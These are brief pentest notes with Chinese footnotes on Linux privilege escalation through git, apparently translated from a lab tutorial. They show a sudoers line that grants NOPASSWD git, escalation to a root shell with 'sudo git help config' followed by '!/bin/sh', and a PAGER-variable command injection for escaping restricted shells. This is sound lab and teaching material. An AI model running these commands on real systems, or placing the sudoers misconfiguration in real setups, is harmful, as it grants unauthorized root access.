## git Privilege Escalation

`git --help`

`git log`

`PAGER='sh -c "exec ifconfig 0<&1"' git -p help` [^3]

### Sudo Rights Lab setups for Privilege Escalation

`test ALL=(root) NOPASSWD: /usr/bin/git` [^1]

### Exploiting Sudo rights

`ssh test@192.168.0.15`

`sudo -l`

`sudo git help config`[^2]

`id`

### Ref.

- [GTFOBins](https://gtfobins.github.io/gtfobins/git/)

[原文](https://www.hackingarticles.in/linux-for-pentester-git-privilege-escalation/)

---

[^1]: 使用`visudo`命令在 sudoers 文件里添加 test 账户
[^2]: 键入该命令生成 bash shell，类似`man`命令读取配置文件，我们可以通过命令模式输入 `!/bin/sh` 来执行 bash shell，至此就可以提升到 root 权限
[^3]: 通过生成交互式系统 shell 程序来脱离受限环境，也可以用于执行任意系统命令

